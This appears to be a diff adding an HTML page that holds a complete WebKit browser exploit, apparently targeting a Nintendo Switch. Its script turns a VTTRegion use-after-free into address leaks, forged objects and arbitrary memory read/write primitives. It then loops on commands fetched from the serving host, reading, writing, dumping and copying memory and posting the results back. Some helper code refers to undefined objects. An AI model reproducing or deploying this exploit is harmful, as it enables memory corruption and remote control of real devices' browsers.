@@ -1,0 +1,558 @@
+<body>
+<script>
+
+//--------------------------Log---------------------------//
+var req = null;
+function send(data)
+{
+    if(req == null){
+        req = new XMLHttpRequest();
+    }
+    req.open("POST", "/log", false);
+    req.send(data)
+}
+
+function recv()
+{
+    if(req == null){
+        req = new XMLHttpRequest();
+    }
+    while(true){
+        try{
+            req.open("GET", "/cmd", false);
+            req.send()
+            if(req.status == 200){
+                return req.responseText;
+            }
+        }catch(e){
+        }
+    }
+}
+
+function log (msg) {
+  send(msg === undefined ? 'undefined' : "[log] "+msg.toString())
+}
+ 
+
+//--------------------Leak---------------------------------//
+//global
+//global to use this after
+var sprayCount = 0x20000;
+var ar = new Array(sprayCount);
+var vrs = new Array(10);
+function leakAddrs (obja, objb, objc, cb)
+{
+    //---------------internal functions-------------------//
+    function __gc(){
+        try{
+            var aaa;
+            for(var i=0; i<100; i++){
+                aaa = new ImageData(1, 0x100000);
+            }
+        }catch(e){}
+    }
+
+    function __utf16ToHex(str, index){
+        var tmp =  "0000"+(str.codePointAt(index).toString(16).toUpperCase())
+        tmp = tmp.substr(tmp.length - 4);
+        var tmp1 = tmp.substr(0,2);
+        var tmp2 = tmp.substr(tmp.length - 2);
+        return tmp2+" "+tmp1;
+    }
+
+    function __dumpUtf16(str, offset, count){
+        offset = offset/2;
+        count  = count/2;
+        
+        var tmp = "";
+        for(var i=0; i<count; i++){
+            tmp += __utf16ToHex(str, offset+i)+" ";
+            if(i%8 ==7){
+                tmp+="\n";
+            }
+        }
+        return tmp;
+    }
+
+    function __d2hex(n){
+        if (n < 0){
+            n = 0xFFFFFFFF + n + 1;
+        }
+        return n.toString(16).toUpperCase();
+    }
+    
+    function __016x(val){
+        return __d2hex(val[1])+""+__d2hex(val[0]);
+    }
+    
+    
+    function __read32(str, index){
+        var tmp = 0;
+        tmp = (str.codePointAt(index+1)<<16) + str.codePointAt(index)
+        return tmp;
+    }
+    
+
+    //----------------------main------------------------//
+    try{
+        var bSucess = false;
+
+ 
+        for(var i=0; i<vrs.length; i++){
+            vrs[i] = new VTTRegion();
+            vrs[i].height = 0xDEAD; //This is a mark
+            var v = document.createElement("video");
+            v.appendChild(document.createElement("track"));
+            v.textTracks[0].addRegion(vrs[i]);
+            v = null;
+        }
+
+        //call the GC to actually free the VTTTextTrack
+        __gc();
+        
+        //spray arrays with objects address
+        for(var i=0; i<sprayCount; i++){
+            //Size matters for next step
+            ar[i] = [obja, objb, objc, {}, {}, {}, {}, {}, {}, {}];
+        }
+        
+        //search for corrupted VTTTextTrack
+        for(var i=0; i<vrs.length; i++){
+            var vict = vrs[i].track.kind;
+            log("len: "+vict.length);
+            if(vict.length > 2000000){
+                
+                addrOfObjA = [__read32(vict, 0), __read32(vict, 2)];
+                addrOfObjB = [__read32(vict, 4), __read32(vict, 6)];
+                addrOfObjC = [__read32(vict, 8), __read32(vict, 10)];
+                
+                log("addrOfObjA: "+convert8(addrOfObjA));
+                log("addrOfObjB: "+convert8(addrOfObjB));
+                log("addrOfObjC: "+convert8(addrOfObjC));
+                
+                cb("", addrOfObjA, addrOfObjB, addrOfObjC);
+                bSucess = true;
+                break;
+            }
+        }
+        
+        if(bSucess == false){
+            alert("failed, try again, please use power button !")
+        }else{
+            alert("success");
+        }
+    }catch(e){alert(e)}
+}
+
+
+//------------------------Exploit------------------------------//
+function buildObject (lo, hi, cb) {
+  log('Building stuff.')
+  var a = [0, 4.243991582e-314, u2d(lo, hi), 3.5e-323, 3.5e-323];
+  var f = document.body.appendChild(document.createElement('iframe'));
+  f.contentWindow.Array.prototype.__defineGetter__(100, () => 1);
+  var sub = f.contentWindow.Array.prototype.slice.call(a, 0, 4)
+  f.remove();
+  cb(sub[0]);
+}
+
+var _dview
+function u2d (low, hi) {
+  if (!_dview) _dview = new DataView(new ArrayBuffer(8))
+  _dview.setUint32(0, low, true)
+  _dview.setUint32(4, hi, true)
+  return _dview.getFloat64(0, true)
+}
+
+window.minmain = function minmain () {
+  log('Starting.')
+  buildObject(0, 0, function (b) {
+    buildObject(0x1337, 0x1, function (d) {
+      var sid = 1
+      var magic = {
+        'a': u2d(sid, 0x1602300 - 0x10000),
+        'b': b,
+        'c': u2d(1, 2),
+        'd': d
+      }
+      d = 0
+      b = 0
+
+      var bstore = new ArrayBuffer(0x10 * 4)
+      var rwmagic = new Uint32Array(bstore)
+      var leakee = {'b': null}
+      var leaker = {'a': leakee}
+      leakAddrs(magic, rwmagic, leaker, function (err, magicaddr, rwaddr, leakeraddr) {
+        if (err) {
+          return alert('error leaking')
+        }
+        buildObject(rwaddr[0], rwaddr[1], function (c) {
+          magic.c = c
+          c = 0
+          buildObject(magicaddr[0] + 4 * 4, magicaddr[1], function (o) {
+            log('Inside o...')
+            while (sid < 0x10000 && !(o instanceof Uint32Array)) { magic.a = u2d(++sid, 0x1602300 - 0x10000) }
+            if (!(o instanceof Uint32Array)) {
+              log('Could not find structure ID.  Wtf?')
+              return
+            }
+            log('Success?')
+            var save = [o[4], o[5], o[6]]
+
+            o[4] = leakeraddr[0]
+            o[5] = leakeraddr[1]
+            o[6] = 0x1337
+
+            var va = new Uint32Array(bstore)
+            var vb = new Uint32Array(bstore)
+            leaker['a'] = leakee
+            leakee['b'] = {'a': va}
+            var leakaddr = [rwmagic[4], rwmagic[5]]
+
+            o[4] = leakaddr[0]
+            o[5] = leakaddr[1]
+            var ta = [rwmagic[4], rwmagic[5]]
+            o[4] = ta[0]
+            o[5] = ta[1]
+            var addra = [rwmagic[4], rwmagic[5]]
+
+            o[4] = leakaddr[0]
+            o[5] = leakaddr[1]
+            leakee['b'] = {'a': vb}
+            ta = [rwmagic[4], rwmagic[5]]
+            o[4] = ta[0]
+            o[5] = ta[1]
+            var addrb = [rwmagic[4], rwmagic[5]]
+
+            o[4] = addra[0]
+            o[5] = addra[1]
+            rwmagic[4] = addrb[0]
+            rwmagic[5] = addrb[1]
+
+            o[4] = save[0]
+            o[5] = save[1]
+            o[6] = save[2]
+            rwmagic = 0
+            magic.a = 0
+            magic.b = 0
+            magic.c = 0
+            magic.d = 0
+            o = 0
+
+            loadRun({
+              bstore: bstore,
+              va: va,
+              vb: vb,
+              leakee: leakee,
+              leakaddr: leakaddr
+            })
+          })
+        })
+      })
+    })
+  })
+}
+
+
+
+
+
+
+var va;
+var vb;
+var leakee;
+var leakaddr;
+var base;
+
+read4 = function(addr, offset) {
+  if(arguments.length == 1)
+    offset = 0;
+
+  va[4] = addr[0];
+  va[5] = addr[1];
+  va[6] = 1 + offset;
+
+  return vb[offset];
+};
+
+read8 = function(addr, offset) {
+  if(arguments.length == 1)
+    offset = 0;
+  return [read4(addr, offset), read4(addr, offset + 1)];
+}
+
+
+write4 = function(val, addr, offset) {
+  if(arguments.length == 2)
+    offset = 0;
+
+  va[4] = addr[0];
+  va[5] = addr[1];
+  va[6] = 1 + offset;
+
+  vb[offset] = val;
+}
+
+write8 = function(val, addr, offset) {
+  if(arguments.length == 2)
+    offset = 0;
+    if(typeof(val) == 'number') 
+        val = [val, 0];
+  write4(val[0], addr, offset);
+  write4(val[1], addr, offset + 1);
+};
+
+
+function add2(addr, off) {
+  if(typeof(off) == 'number')
+    off = [off, 0];
+
+  var alo = addr[0], ahi = addr[1];
+  var blo = off[0], bhi = off[1];
+
+  var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
+  var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;
+
+  if((nlo < alo && blo > 0) || (nlo == alo && blo != 0)) {
+    nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
+  } else if(nlo > alo && blo < 0) {
+    nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
+  }
+
+  return [nlo, nhi];
+}
+
+function paddr(lo, hi) {
+  if(arguments.length == 1) {
+    hi = lo[1];
+    lo = lo[0];
+  }
+  var slo = ('00000000' + lo.toString(16)).slice(-8);
+  var shi = ('00000000' + hi.toString(16)).slice(-8);
+  return shi + slo;
+}
+
+
+getAddr = function(obj) {
+  leakee['b'] = {'a' : obj};
+  return read8(read8(leakaddr, 4), 4);
+}
+
+//utils
+
+//parse a string to internal addr
+function parse8(str)
+{
+    var tmp = str.substring(0, 8);
+    var hi = parseInt(tmp, 16)
+    tmp = str.slice(-8)
+    var lo = parseInt(tmp, 16)
+    return [lo,hi]
+}
+
+//Convert internal address to string
+function convert8(value)
+{
+    var n = value[0];
+    if (n < 0){
+        n = 0xFFFFFFFF + n + 1;
+    }
+    var slo = ("00000000" + n.toString(16)).slice(-8)
+    var n = value[1];
+    if (n < 0){
+        n = 0xFFFFFFFF + n + 1;
+    }
+    var shi = ("00000000" + n.toString(16)).slice(-8)
+    return shi+slo;
+}
+
+function extend8(value)
+{
+    return ("0000000000000000"+value).slice(-16);
+}
+
+//checkif value is a valid value
+function check8(value)
+{
+    return true;
+    var regex = /[0-9A-Fa-f]/y;
+    if(regex.test(value)){
+        return true
+    }
+    return false;
+}
+
+
+
+getBase = function() {
+
+    func = document.getElementById;
+    func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
+    funcaddr = null;
+    funcbase = 0x8365B8; // This is the base address for getElementById in the webkit module
+  
+  
+    var tlfuncaddr = getAddr(func);
+    funcaddr = read8(tlfuncaddr, 6);
+
+    var baseaddr = add2(read8(funcaddr, 8), -funcbase);
+
+    log('webkit: ' + paddr(baseaddr));
+
+    return baseaddr;
+};
+
+walkList = function() {
+  var addr = this.base;
+  utils.dlog('Initial NRO at ' + utils.paddr(addr));
+
+  while(true) {
+    var baddr = addr;
+
+    var modoff = this.read4(addr, 1);
+    addr = utils.add2(addr, modoff);
+    var modstr = this.read4(addr, 6);
+    addr = utils.add2(addr, modstr);
+
+    // Read next link ptr
+    addr = this.read8(addr);
+    if(utils.nullptr(addr)) {
+      utils.log('Reached end');
+      break;
+    }
+
+    var nro = this.read8(addr, 8);
+
+    if(utils.nullptr(nro)) {
+      utils.dlog('Hit RTLD at ' + utils.paddr(addr));
+      addr = this.read8(addr, 4);
+      break;
+    }
+
+    if(this.read4(nro, 4) != 0x304f524e) {
+      utils.log('Something is wrong.  No NRO header at base.');
+      break;
+    }
+
+    addr = nro;
+    utils.dlog('Found NRO at ' + utils.paddr(nro));
+  }
+
+  while(true) {
+    var nro = this.read8(addr, 8);
+    if(utils.nullptr(nro)) {
+      utils.dlog('Hm, hit the end of things.  Back in rtld?');
+      return;
+    }
+
+    if(this.read4(nro, this.read4(nro, 1) >> 2) == 0x30444f4d) {
+      utils.dlog('Got MOD at ' + utils.paddr(nro));
+      if(this.read4(nro, 4) == 0x8DCDF8 && this.read4(nro, 5) == 0x959620) {
+        utils.dlog('Found main module.');
+        return nro;
+      }
+    } else {
+      utils.dlog('No valid MOD header.  Back at RTLD.');
+      break;
+    }
+
+    addr = this.read8(addr, 0);
+    if(utils.nullptr(addr)) {
+      utils.dlog('End of chain.');
+      break;
+    }
+  }
+};
+
+
+//min main
+
+function loadRun (obj)
+{
+    va = obj.va;
+    vb = obj.vb;
+    leakee = obj.leakee;
+    leakaddr = obj.leakaddr;
+
+    send("Connected\n");
+    
+    var objM = new VTTRegion();
+    var v = document.createElement("video");
+    v.appendChild(document.createElement("track"));
+    v.textTracks[0].addRegion(objM);
+    
+    send("corruptedTrack: " + convert8(getAddr(vrs[0].track)));
+    send("cleanTrack: " + convert8(getAddr(objM.track)));
+    
+    //send("alertAddr: " + convert8(getAddr(alert)));
+    
+    base = getBase();
+    
+    while(true)
+    {
+        data = recv()
+        var args = data.split(" ");
+        var cmd = args[0];
+        if(cmd == "read8"){
+            if(check8(args[1]) == false){
+                send("read8: invalid parameters");
+            }else{
+                var addr = extend8(args[1]);
+                addr = parse8(addr);
+                value = read8(addr);
+                send(convert8(value))
+            }
+        }else if(cmd == "write8"){
+            if(check8(args[1]) == false || check8(args[2]) == false){
+                send("write8: invalid parameters");
+            }else{
+                var addr = extend8(args[1]);
+                addr = parse8(addr);
+                var value = extend8(args[2]);
+                value = parse8(value);
+                write8(value, addr);
+                log("write8: OK!")
+            }
+        }else if(cmd == "dump"){
+            if(check8(args[1]) == false || args[2] == undefined){
+                send("dump: invalid parameters");
+            }else{
+                var addr = extend8(args[1]);
+                addr = parse8(addr);
+                var str = "";
+                for(var i=0; i<parseInt(args[2]); i++){
+                    str += i+" "+convert8(add2(addr, i*8))+" : "+convert8(read8(add2(addr, i*8)))+"\n";
+                }
+                send(str)
+            }
+        }else if(cmd == "memcpy8"){
+            var dest = parse8(extend8(args[1]));
+            var source = parse8(extend8(args[2]));
+            var count = parseInt(args[3]);
+            for(var i=0; i<count; i++){
+                write8(read8(add2(source, i*8)), add2(dest, i*8));
+            }
+            log("memcpy8: OK!")
+        }else if(cmd == "memset8"){            
+            var dest = parse8(extend8(args[1]));
+            var value = parse8(extend8(args[2]));
+            var count = parseInt(args[3]);
+            for(var i=0; i<count; i++){
+                write8(value, add2(dest, i*8));
+            }
+            log("memset8: OK!")
+        }else if(cmd == "exit"){
+            send("bye bye !");
+            break;
+        }else{
+            send("unknow cmd");
+        }
+    }
+}
+
+
+window.minmain();
+
+
+</script>
+<body>
